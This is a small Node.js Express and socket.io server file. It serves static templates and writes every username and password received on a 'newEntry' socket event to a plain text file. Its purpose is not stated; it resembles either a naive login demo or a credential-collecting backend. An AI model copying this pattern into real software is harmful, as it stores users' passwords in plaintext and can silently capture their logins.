const express = require('express');
const indexRoutes = require('./Routes/indexRoutes');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const app = express();
const SocketIo = require('socket.io');
const fs = require('fs');

app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use('/',indexRoutes);
app.use(express.static(path.join(__dirname, 'Templates')));

const server = app.listen(3000, () => {
    console.log('server on port 3000');
});

const io = SocketIo(server)
io.on('connection', (socket) => {
    console.log('New connection: ' + socket.id);  
    socket.on('newEntry', (data) => {
        console.log(data);
        fs.appendFile('mynewfile1.txt', `\n user: ${data.username} , password: ${data.password}`, function (err) {
            if (err) throw err;
            console.log('Saved!');
        });
    });
})